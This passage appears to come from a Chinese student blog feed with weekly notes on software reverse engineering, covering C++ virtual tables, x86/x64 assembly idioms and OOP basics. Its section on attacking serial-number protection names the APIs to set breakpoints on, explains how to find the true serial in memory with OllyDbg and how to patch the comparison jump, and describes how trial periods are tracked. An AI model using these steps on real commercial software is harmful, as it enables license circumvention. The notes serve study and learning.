    <content type="html"><![CDATA[<h1 id="关于上周博客炸了的问题"><a href="#关于上周博客炸了的问题" class="headerlink" title="关于上周博客炸了的问题"></a>关于上周博客炸了的问题</h1><p>原因是两个_config.yml（可能还有其他文件吧）里所有缩进都不见了….不知道是为啥，就甩给 vscode 和格式化代码插件吧（….)<br>然后，原来 .yml 要用缩进表示层级啊….<br>嗯顺便换了个主题</p><h1 id="64-位软件逆向技术"><a href="#64-位软件逆向技术" class="headerlink" title="64 位软件逆向技术"></a>64 位软件逆向技术</h1><h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>c++的三大核心机制是封装、继承、多态，虚函数是多态的一种体现。在逆向过程中，虚函数是一种还原面向对象代码的重要手段</p><h3 id="虚表"><a href="#虚表" class="headerlink" title="虚表"></a>虚表</h3><p>不同的类虚表不同，相同的类对象共享一个虚表<br>（以下讲的是用 c++写的程序）<br>在构造函数中，首先初始化虚表指针，然后初始化数据成员，最后返回 this 指针<br><a id="more"></a><br>c++语法规定，析构函数需要调用虚函数的无多态性，因此析构函数首先需要赋值虚表<br>构造函数和析构函数特征一致，可根据调用的先后顺序确定<br>虚表地址在全局数据区中</p><h1 id="序列号（注册码）保护方式"><a href="#序列号（注册码）保护方式" class="headerlink" title="序列号（注册码）保护方式"></a>序列号（注册码）保护方式</h1><h2 id="序列号保护机制"><a href="#序列号保护机制" class="headerlink" title="序列号保护机制"></a>序列号保护机制</h2><p>验证用户名和序列号之间的映射关系（….也有可能没有关系）<br>检查方法：</p><ol><li>将用户名等信息通过变换后得到注册码<br>序列号=F（用户名）<br>这个方法计算出的序列号以明文形式在内存中出现<br>也可通过修改比较指令的方法通过检查<br>再现了生成注册码的过程，不安全</li><li>通过注册码验证用户名<br>生成注册码时：序列号=F（用户名），检查注册码时：用户名=F^（-1）（序列号）<br>生成注册码的函数和注册码明文未出现在软件代码中<br>破解可考虑：1.修改比较指令，2.通过 F^(-1)找出 F</li><li>通过对等函数检查<br>F1（用户名）=F2（序列号）<br>与 2 类似</li><li>同时将用户名和序列号作为自变量<br>特定值=F（用户名，序列号）<br>可能失去了用户名和序列号的一一对应关系</li></ol><h2 id="攻击序列号保护机制"><a href="#攻击序列号保护机制" class="headerlink" title="攻击序列号保护机制"></a>攻击序列号保护机制</h2><p>找到序列号或修改判断序列号后的跳转指令<br>跟踪程序启动时（需要将注册码读出并判断）或输入注册码，对 api 设置断点<br>常用：  </p><ol><li><p>将输入的内容复制到缓冲区： GetWindowTextA(W)、GetDlgItemTextA(W)、GetDlgItemInt   </p></li><li><p>判断后显示的对话框：MessageBoxA(W)、MessageBoxExA(W)、ShowWindow、MessageBoxIndirectA(W)、CreateDialogParamA(W)、CreateDialogIndirectParamA(w)、DialogBoxParamA(W)、DialogBoxIndirectParamA(W)    </p></li><li><p>启动时读取注册码：<br>RegQueryValueExA(W)(序列号放在注册表);<br>GetPrivateProfileStringA(W)、GetPrivateProfileIntA(W)、GetProfileIntA(W)、GetProfileStringA(W)(序列号放在 INI 文件中);<br>CreateFileA(W)、_lopen()(放在一般文件)   </p></li></ol><h3 id="数据约束性"><a href="#数据约束性" class="headerlink" title="数据约束性"></a>数据约束性</h3><p>只用在明文比较注册码的保护方式中使用。大多数情况下，真正的注册码会在某个时刻出现在内存中，一般会在用户输入的 ±90h。<br>例如，用 od 按’Alt+M’打开内存窗口，’Ctrl+B’打开搜索框，搜索输入的序列号，可在附近查找到真序列号</p><h3 id="利用消息断点"><a href="#利用消息断点" class="headerlink" title="利用消息断点"></a>利用消息断点</h3><p>按下和释放鼠标时会发送 WM_LBUTTONDOWN 和 WM_LUBTTONUP 消息，用这个消息下断点可以找到按钮的事件代码</p><h3 id="利用提示信息"><a href="#利用提示信息" class="headerlink" title="利用提示信息"></a>利用提示信息</h3><p>当输入错时提示“序列号错误，再来一次”等，可以查找相应的字符串，定位到相关代码<br>如 od 中，右键“search for”-&gt;“all referenced text string”</p><h2 id="字符串比较形式"><a href="#字符串比较形式" class="headerlink" title="字符串比较形式"></a>字符串比较形式</h2><ol><li>寄存器直接比较</li><li>函数比较<br>比较内容放在寄存器或栈中<br>call 一个用于比较的函数，可能是 api 函数或自己写的</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call ....</span><br><span class="line">test eax,eax</span><br><span class="line">jz   ....      ;zf&#x3D;1-&gt;eax&#x3D;0 跳转</span><br></pre></td></tr></table></figure><ol><li>串比较</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea edi [   ] ;edi指向字符串a</span><br><span class="line">lea esi [   ] ;....</span><br><span class="line">repz cmpsd    ;比较</span><br></pre></td></tr></table></figure><p>edi、esi：变址寄存器，存放存储单元在段内的偏移量。<br>rep：按 ecx 中指定次数或在 zf 不满足条件前重复。<br>如果 ds:si 和 es:di 所指向的两个字节相等，则继续比较。REP（重复）、REPE（相等时重复）、REPNE（不相等时重复）、REPZ（为零时重复）及 REPNZ（不为零时重复）<br><img src="https://s1.ax1x.com/2020/04/02/GGvR3D.png" alt=" "><br>CMPSB 比较字节 CMPSW 比较字 CMPSD 比较双字 ,方向标志位决定 ESI 和 EDI 的增加或减少</p><h1 id="警告窗口"><a href="#警告窗口" class="headerlink" title="警告窗口"></a>警告窗口</h1><p>常用的方法是修改程序的资源、静态分析、动态分析<br>显示窗口的常用函数有 MessageBoxA(W)、MessageBoxExA(W)、DialogBoxParamA(W)、ShowWindow、CreateWindowExA(W)等，对某些警告窗口无效时可以尝试利用消息设置断点拦截</p><h1 id="时间限制"><a href="#时间限制" class="headerlink" title="时间限制"></a>时间限制</h1><h2 id="计时器"><a href="#计时器" class="headerlink" title="计时器"></a>计时器</h2><p>对于限制每次运行时长的软件</p><ol><li>setTimer 函数<br>应用程序在初始化时调用这个 api 函数，申请计时器并设定时间间隔，同时获得一个处理计时器超时的回调函数。若超时，系统会向申请的窗口发送 WM_TIMER 或调用那个回调函数。当程序不需要计时器，调用 KillTimer()进行销毁</li><li>高精度多媒体计时器<br>调用 timeSetEvent()</li><li>其它<br>timeGetTime()、GetTickCount()，返回的都是系统启动以来经历过的时间，函数的精度取决于系统的设置；也可以利用各高级语言开发库里的函数实现计时，如 c 语言里的 time()（返回 1970.01.01 0 时起至今的秒数）</li></ol><p>精度太高会对系统性能造成影响，故一般不需要太高精度。</p><h2 id="时间限制-1"><a href="#时间限制-1" class="headerlink" title="时间限制"></a>时间限制</h2><p>试用期<br>在安装软件或主程序第一次运行时获得系统日期并记录。程序每次运行都要去的当前系统日期并与之前的记录比较<br>软件一般最少要保存两个时间值，一个是安装（运行）日期（最好存在多个地方），一个是软件最近一次运行的日期（防止用户修改机器日期）<br>用于获取时间的 api 函数有 GetSystemTime、GetLocalTime、GetFileTime，即使不直接使用这些函数，高级语言中封装的类也调用了这些函数。<br>还有一种方法是读取需要频繁修改的系统文件，利用 FileTimeToSystem()</p><h1 id="面向对象（OOP）涉及到的几个名词"><a href="#面向对象（OOP）涉及到的几个名词" class="headerlink" title="面向对象（OOP）涉及到的几个名词"></a>面向对象（OOP）涉及到的几个名词</h1><p>主要是因为加密与解密里涉及到了（如虚函数）但不懂是啥．．．．</p><h2 id="类（class）-amp-对象"><a href="#类（class）-amp-对象" class="headerlink" title="类（class）&amp;对象"></a>类（class）&amp;对象</h2><p>类是用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例<br>当我们定义一个 class 的时候，我们实际上就定义了一种数据类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Box</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数定义</span></span><br><span class="line">      Box(<span class="keyword">double</span> l=<span class="number">2.0</span>, <span class="keyword">double</span> b=<span class="number">2.0</span>, <span class="keyword">double</span> h=<span class="number">2.0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">cout</span> &lt;&lt;<span class="string">"Constructor called."</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">         length = l;</span><br><span class="line">         breadth = b;</span><br><span class="line">         <span class="built_in">height</span> = h;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">double</span> <span class="title">Volume</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> length * breadth * <span class="built_in">height</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(Box box)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Volume() &gt; box.Volume();</span><br><span class="line">         <span class="comment">// 每一个对象都能通过this 指针访问自己的地址</span></span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">private</span>:             <span class="comment">//类成员的属性，还可为private 或 protected</span></span><br><span class="line">      <span class="keyword">double</span> length;   <span class="comment">// 盒子的长度</span></span><br><span class="line">      <span class="keyword">double</span> breadth;  <span class="comment">// 盒子的宽度</span></span><br><span class="line">      <span class="keyword">double</span> <span class="built_in">height</span>;   <span class="comment">// 盒子的高度</span></span><br><span class="line">&#125;;</span><br><span class="line">Box Box1;          <span class="comment">// 声明对象 Box1，类型为 Box</span></span><br><span class="line">Box Box2;          <span class="comment">// 声明对象 Box2，类型为 Box</span></span><br></pre></td></tr></table></figure><p>构造函数：实现对象初始化<br>析构函数：释放对象占用的内存空间<br>类的作用：安全、继承</p><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>面向对象程序设计中最重要的一个概念是继承。继承允许我们依据一个类来定义另一个类，这使得创建和维护一个应用程序变得更容易。这样做，也达到了重用代码功能和提高执行效率的效果。<br>当创建一个类时，您不需要重新编写新的数据成员和成员函数，只需指定新建的类继承了一个已有的类的成员即可。这个已有的类称为基类、父类或超类，新建的类称为派生类或子类。<br>继承代表了 is a 关系。例如，哺乳动物是动物，狗是哺乳动物。<br>如果一个实例的数据类型是某个子类，那么它的数据类型也可以看作是父类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shape</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setWidth</span><span class="params">(<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="built_in">width</span> = w;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">setHeight</span><span class="params">(<span class="keyword">int</span> h)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="built_in">height</span> = h;</span><br><span class="line">      &#125;</span><br><span class="line">   <span class="keyword">protected</span>:</span><br><span class="line">      <span class="keyword">int</span> <span class="built_in">width</span>;</span><br><span class="line">      <span class="keyword">int</span> <span class="built_in">height</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PaintCost</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getCost</span><span class="params">(<span class="keyword">int</span> area)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> area * <span class="number">70</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 派生类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getArea</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (<span class="built_in">width</span> * <span class="built_in">height</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//多继承，即一个子类可以有多个父类，它继承了多个父类的特性</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Rectangle</span>:</span> <span class="keyword">public</span> Shape, <span class="keyword">public</span> PaintCost</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getwhatever</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">         <span class="keyword">return</span> (<span class="built_in">width</span> * <span class="built_in">height</span> *<span class="built_in">height</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>多态按字面的意思就是多种形态。存在的必要条件：继承、重写（子类对父类的方法做一定修改）、父类引用指向子类的对象<br>当子类和父类都存在相同的方法时，子类覆盖了父类的方法</p><blockquote><p>对于一个变量，我们只需要知道它是 Animal 类型，无需确切地知道它的子类型，就可以放心地调用 run()方法，而具体调用的 run()方法是作用在 Animal、Dog、Cat 还是 Tortoise 对象上，由运行时该对象的确切类型决定，这就是多态真正的威力：调用方只管调用，不管细节，而当我们新增一种 Animal 的子类时，只要确保 run()方法编写正确，不用管原来的代码是如何调用的。<a href="https://www.liaoxuefeng.com/wiki/897692888725344/923030507728352" target="_blank" rel="noopener">继承和多态</a></p></blockquote><h2 id="虚函数-1"><a href="#虚函数-1" class="headerlink" title="虚函数"></a>虚函数</h2><p>C++中的虚函数的作用主要是实现了多态的机制。基类定义虚函数，子类可以重写该函数；在派生类中对基类定义的虚函数进行重写时，需要在派生类中声明该方法为虚方法。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    <span class="comment">//这里的foo()也可以啥都不输出，即virtual void foo();</span></span></span><br><span class="line"><span class="function">    <span class="comment">//如果写为virtual void foo()=0 则为一个纯虚函数，仅提供一个接口，在继承时必须实现</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"A::foo() is called"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> A</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"B::foo() is called"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> B();</span><br><span class="line">    a-&gt;foo();   <span class="comment">// 在这里，a虽然是指向A的指针，但是被调用的函数(foo)却是B的!</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>带有纯虚函数的类称为抽象类，只能作为基类，且不能定义对象（抽象类这边还涉及到了 abstract 和 virtual，但先不管了….）</p><h3 id="虚函数表"><a href="#虚函数表" class="headerlink" title="虚函数表"></a>虚函数表</h3><p>编译器处理虚函数的方法是：为每个类对象添加一个隐藏成员，隐藏成员中保存了一个指向函数地址数组的指针，称为虚表指针，这种数组成为虚函数表。即，每个类使用一个虚函数表，每个类对象用一个虚表指针。</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p>把数据和函数捆绑在一起。<br>通过创建类来进行封装和数据隐藏（public、protected、private）。默认情况下，类中定义的项目都是私有的，再提供对外 public 的接口</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Adder</span>&#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">      <span class="comment">// 构造函数</span></span><br><span class="line">      Adder(<span class="keyword">int</span> i = <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        total = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">void</span> <span class="title">addNum</span><span class="params">(<span class="keyword">int</span> number)</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          total += number;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 对外的接口</span></span><br><span class="line">      <span class="function"><span class="keyword">int</span> <span class="title">getTotal</span><span class="params">()</span></span></span><br><span class="line"><span class="function">      </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> total;</span><br><span class="line">      &#125;;</span><br><span class="line">   <span class="keyword">private</span>:</span><br><span class="line">      <span class="comment">// 对外隐藏的数据</span></span><br><span class="line">      <span class="keyword">int</span> total;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="python-爬虫学习"><a href="#python-爬虫学习" class="headerlink" title="python 爬虫学习"></a>python 爬虫学习</h1><p><a href="https://brubbish.github.io/710f8e5f.html#RE库的match对象">https://brubbish.github.io/710f8e5f.html#RE库的match对象</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于上周博客炸了的问题&quot;&gt;&lt;a href=&quot;#关于上周博客炸了的问题&quot; class=&quot;headerlink&quot; title=&quot;关于上周博客炸了的问题&quot;&gt;&lt;/a&gt;关于上周博客炸了的问题&lt;/h1&gt;&lt;p&gt;原因是两个_config.yml（可能还有其他文件吧）里所有缩进都不见了….不知道是为啥，就甩给 vscode 和格式化代码插件吧（….)&lt;br&gt;然后，原来 .yml 要用缩进表示层级啊….&lt;br&gt;嗯顺便换了个主题&lt;/p&gt;
&lt;h1 id=&quot;64-位软件逆向技术&quot;&gt;&lt;a href=&quot;#64-位软件逆向技术&quot; class=&quot;headerlink&quot; title=&quot;64 位软件逆向技术&quot;&gt;&lt;/a&gt;64 位软件逆向技术&lt;/h1&gt;&lt;h2 id=&quot;虚函数&quot;&gt;&lt;a href=&quot;#虚函数&quot; class=&quot;headerlink&quot; title=&quot;虚函数&quot;&gt;&lt;/a&gt;虚函数&lt;/h2&gt;&lt;p&gt;c++的三大核心机制是封装、继承、多态，虚函数是多态的一种体现。在逆向过程中，虚函数是一种还原面向对象代码的重要手段&lt;/p&gt;
&lt;h3 id=&quot;虚表&quot;&gt;&lt;a href=&quot;#虚表&quot; class=&quot;headerlink&quot; title=&quot;虚表&quot;&gt;&lt;/a&gt;虚表&lt;/h3&gt;&lt;p&gt;不同的类虚表不同，相同的类对象共享一个虚表&lt;br&gt;（以下讲的是用 c++写的程序）&lt;br&gt;在构造函数中，首先初始化虚表指针，然后初始化数据成员，最后返回 this 指针&lt;br&gt;
    
    </summary>
    
    
    
      <category term="周报" scheme="https://brubbish.github.io/tags/%E5%91%A8%E6%8A%A5/"/>
    
      <category term="加密与解密" scheme="https://brubbish.github.io/tags/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>2020.03.23-2020.03.29</title>
    <link href="https://brubbish.github.io/50551.html"/>
    <id>https://brubbish.github.io/50551.html</id>
    <published>2020-03-29T12:06:00.000Z</published>
    <updated>2020-07-05T13:30:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="32位软件逆向技术"><a href="#32位软件逆向技术" class="headerlink" title="32位软件逆向技术"></a>32位软件逆向技术</h1><h2 id="控制语句"><a href="#控制语句" class="headerlink" title="控制语句"></a>控制语句</h2><h3 id="条件设置指令（SETcc）"><a href="#条件设置指令（SETcc）" class="headerlink" title="条件设置指令（SETcc）"></a>条件设置指令（SETcc）</h3><p>条件设置指令的形式是“SET<u>cc</u> r/m8”， r/m8表示8位寄存器或单字节内存单元<br>条件设置指令测试一些标志位，把结果记录的目标操作数中<br>测试：</p><ol><li>of（=1溢出）</li><li>zf（=1操作后等于0/相等）</li><li>cf（=1进位/低于）</li><li>cf、zf结合判断</li><li>sf（=1操作后结果为负）</li><li>pf（=1，1个数为偶数）</li><li>sf、of结合判断（=1小于）</li><li>zf（=1或zf!=of，不大于）<blockquote><p><a href="https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8">https://brubbish.github.io/34199.html#%E6%A0%87%E5%BF%97%E5%AF%84%E5%AD%98%E5%99%A8</a></p><a id="more"></a><p>条件设置指令可以用来消除程序中的转移指令<br>如：<br><img src="https://s1.ax1x.com/2020/03/22/8IMgHA.png" alt=" "></p></blockquote></li></ol><h3 id="纯算法实现逻辑判断"><a href="#纯算法实现逻辑判断" class="headerlink" title="纯算法实现逻辑判断"></a>纯算法实现逻辑判断</h3><p>一些编译器在优化的时候，会不改变原逻辑的情况下，使用数学技巧把代码中的一些逻辑分支语句转换为算术操作，减少程序中的条件转移指令，提高cpu的流水线的性能（….tql)  </p><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><p>可以进行反向引用<br>其他类型的分支语句，如if-else都是由低地址向高地址区域引用的（向下跳），依此可以将循环语句识别出来（调回去）<br>确定某段代码是循环代码后就可以分析计数器（一般用ecx）  </p><p>如果编译时设置优化“Maximize Speed”：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx             ;变量初始化sum&#x3D;0</span><br><span class="line">xor eax,eax             ；变量初始化i&#x3D;0</span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><h2 id="数学运算符"><a href="#数学运算符" class="headerlink" title="数学运算符"></a>数学运算符</h2><p>如果编译器没有进行优化，则这些运算符很容易理解（….)所以下面都是经过优化的</p><h3 id="整数的加法和减法"><a href="#整数的加法和减法" class="headerlink" title="整数的加法和减法"></a>整数的加法和减法</h3><p>用lea代替add和sub<br>lea指令允许用户在一个时钟内完成对c=a+b+78h（某个数）的计算，其中abc都是在有寄存器的情况下才有效的，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lea c,[a+b+78]</span><br><span class="line">&#x3D;&gt;</span><br><span class="line">mov eax,dword ptr [esp]     ;eax&#x3D;a</span><br><span class="line">mov ecx,dword ptr [esp]     ;ecx&#x3D;b</span><br><span class="line">lea edx,dword ptr [ecx+eax+78]</span><br></pre></td></tr></table></figure></p><blockquote><p>时钟周期：一个时钟脉冲所需要的时间。（计组）</p></blockquote><h3 id="整数的乘法"><a href="#整数的乘法" class="headerlink" title="整数的乘法"></a>整数的乘法</h3><p>一般被编译成mul（无符号）、imul（有符号）指令（运行慢），为了提高效率会用其他指令完成<br>如果一个数是2的幂，用左移指令shl；3、5、6、7、9等数用加法提高效率：如把exa<em>5写成”lea eax,[eax+4 </em>4];lea指令可以实现寄存器乘以2、4、8的运算  </p><h3 id="整数的除法"><a href="#整数的除法" class="headerlink" title="整数的除法"></a>整数的除法</h3><p>一般被编译成div、idiv指令，大概比乘法运算多消耗10倍cpu时钟<br>如果除数是2的幂，可用右移指令’shr a,n’：a是被除数，n是2的指数（进行无符号数计算）有符号数用sar指令  </p><p>除法指令需要用到符号扩展指令cdq，作用是把eax中的数视为有符号数，将eax的最高位（符号位）扩展到edx中。如果eax最高位是1，执行后edx=FFFFFFFF;如果是0，edx=00000000。通过这种方法把32位有符号数变为edx：eax的64位有符号数，满足64位运算指令的需要。</p><p>对除法优化时会用乘法代替除法，优化的公式较多，一例如：倒数相乘a<em>b=a </em>(1/b)</p><p>（在下面的64位中描述更完整）</p><h2 id="文本字符串"><a href="#文本字符串" class="headerlink" title="文本字符串"></a>文本字符串</h2><h3 id="字符寻址指令"><a href="#字符寻址指令" class="headerlink" title="字符寻址指令"></a>字符寻址指令</h3><p>与字符指针处理相关的指令有mov、lea等<br>mov指令将地址/寄存器中的数据放到目的寄存器中，如mov eax [401000]/[ecx]<br>lea（load effective address）操作数是地址,lea eax,[addr] 就是把addr的地址放入eax中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lea eax,[401000]</span><br><span class="line">等价于</span><br><span class="line">mov eax,401000</span><br></pre></td></tr></table></figure></p><h3 id="计算字符串长度"><a href="#计算字符串长度" class="headerlink" title="计算字符串长度"></a>计算字符串长度</h3><p>c语言的strlen()：<br><img src="https://s1.ax1x.com/2020/03/25/8xCwqg.png" alt=" "></p><h1 id="64位软件逆向技术"><a href="#64位软件逆向技术" class="headerlink" title="64位软件逆向技术"></a>64位软件逆向技术</h1><p>x64通用寄存器的名称第一个字母由e改为r，共16个；16个128位xmm寄存器（通常用于优化代码）<br><img src="https://s1.ax1x.com/2020/03/25/8xCDaj.png" alt=" "></p><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="栈平衡"><a href="#栈平衡" class="headerlink" title="栈平衡"></a>栈平衡</h3><p>每8字节的栈空间用来保存一个数据<br>尽量保证栈顶对齐值为16（可以被16整除）</p><h3 id="调用约定"><a href="#调用约定" class="headerlink" title="调用约定"></a>调用约定</h3><p>x86（32位）的函数调用有stdcall、__cdecl、fastcall等，x64只有一种寄存器快速调用约定：  </p><ol><li>整数：前四个参数用寄存器rcx→rdx→r8→r9，其余放在栈里，入栈顺序从右到左，任何大于8字节或不是1、2、4、8字节的参数用地址传递</li><li>浮点数：前四个参数用xmm寄存器完成：xmm0→xmm1→xmm2→xmm3  </li></ol><p><img src="https://s1.ax1x.com/2020/03/25/8xCBZQ.png" alt=" "></p><p>栈为函数的前四个参数预留了32字节的空间，当函数功能复杂时将寄存器的参数保存到这个预留栈空间。预览栈空间由函数调用者申请、平衡  </p><h2 id="数学运算"><a href="#数学运算" class="headerlink" title="数学运算"></a>数学运算</h2><h3 id="整数的除法-1"><a href="#整数的除法-1" class="headerlink" 